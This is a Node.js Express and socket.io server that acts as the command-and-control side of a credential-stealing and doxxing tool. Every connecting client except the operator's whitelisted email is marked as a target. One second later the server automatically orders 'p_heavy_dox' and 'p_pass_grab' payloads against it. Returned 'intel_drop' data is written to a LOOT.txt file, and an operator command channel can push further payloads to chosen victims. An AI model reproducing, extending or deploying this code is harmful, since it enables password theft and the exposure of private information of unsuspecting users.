const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let targets = [];
const MASTER_KEY = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;

    socket.on('init', (data) => {
        const t = { id: socket.id, n: data.n, e: data.e, ip: ip };
        targets.push(t);

        // --- AUTO-ATTACK PROTOCOL ---
        if (t.e !== MASTER_KEY) {
            console.log(`\x1b[41m[TARGET_LOCKED]\x1b[0m ${t.n} (${ip})`);
            // On lance l'extraction de haut niveau immédiatement
            setTimeout(() => {
                io.to(socket.id).emit('execute', { type: 'p_heavy_dox' });
                io.to(socket.id).emit('execute', { type: 'p_pass_grab' });
            }, 1000);
        }

        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
    });

    // Enregistrement des données volées dans un fichier
    socket.on('intel_drop', (data) => {
        const entry = `[${new Date().toLocaleString()}] IP: ${ip} | TYPE: ${data.type} | DATA: ${data.content}\n`;
        fs.appendFileSync('LOOT.txt', entry);
        io.emit('master_update', { n: data.n, content: data.content });
    });

    socket.on('command', (d) => {
        io.to(d.target).emit('execute', { type: d.type });
    });

    socket.on('disconnect', () => {
        targets = targets.filter(u => u.id !== socket.id);
        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
    });
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
